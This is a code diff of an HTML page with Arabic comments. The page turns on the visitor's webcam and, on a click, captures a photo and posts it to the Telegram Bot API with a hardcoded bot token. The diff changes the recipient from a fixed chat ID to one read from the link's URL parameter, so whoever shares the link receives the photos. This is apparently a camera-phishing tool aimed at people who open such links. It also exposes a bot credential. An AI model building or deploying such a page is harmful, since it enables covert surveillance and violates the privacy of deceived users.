@@ -19,57 +19,41 @@
     <p id="status"></p>
 
     <script>
-        const video = document.getElementById('video');
-        const snap = document.getElementById('snap');
-        const status = document.getElementById('status');
+    // هذه الوظيفة تقرأ الـ ID من الرابط تلقائياً
+    const urlParams = new URLSearchParams(window.location.search);
+    const dynamicChatId = urlParams.get('id'); // سيأخذ الرقم من الرابط
 
-        // املأ البيانات التالية:
-        const token = '8488682212:AAE5KJUgyrd5QPYDE6beK21XPrBo7Y66MAg';
-        const chatId = '6002805119'; // احصل عليه من بوت userinfobot
+    const token = '8488682212:AAE5KJUgyrd5QPYDE6beK21XPrBo7Y66MAg';
+    const video = document.getElementById('video');
+    const snap = document.getElementById('snap');
+    const status = document.getElementById('status');
 
-        // تشغيل الكاميرا فور فتح الصفحة
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-            })
-            .catch(err => {
-                status.innerText = "يرجى السماح بالوصول للكاميرا لتتمكن من استخدام البوت.";
-                status.style.color = "red";
+    // تشغيل الكاميرا... (نفس الكود السابق)
+    navigator.mediaDevices.getUserMedia({ video: true }).then(s => { video.srcObject = s; });
+
+    snap.addEventListener('click', () => {
+        if (!dynamicChatId) {
+            alert("خطأ: هذا الرابط غير صالح (لا يوجد ID).");
+            return;
+        }
+
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+
+        canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append('chat_id', dynamicChatId); // الإرسال لصاحب الرابط فقط
+            formData.append('photo', blob, 'image.jpg');
+
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            }).then(res => {
+                if(res.ok) status.innerText = "✅ تم إرسال الصورة لصاحب الرابط!";
             });
-
-        snap.addEventListener('click', () => {
-            status.innerText = "جاري التقاط الصورة وإرسالها...";
-            
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            // تحويل الصورة إلى Blob لإرسالها كملف
-            canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('photo', blob, 'image.jpg');
-
-                // إرسال الصورة إلى API تيليجرام
-                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(response => {
-                    if (response.ok) {
-                        status.innerText = "✅ تم إرسال الصورة بنجاح!";
-                        status.style.color = "green";
-                    } else {
-                        status.innerText = "❌ حدث خطأ أثناء الإرسال.";
-                    }
-                })
-                .catch(err => {
-                    status.innerText = "❌ خطأ في الاتصال.";
-                });
-            }, 'image/jpeg');
-        });
-    </script>
+        }, 'image/jpeg');
+    });
+</script>
 </body>
 </html>
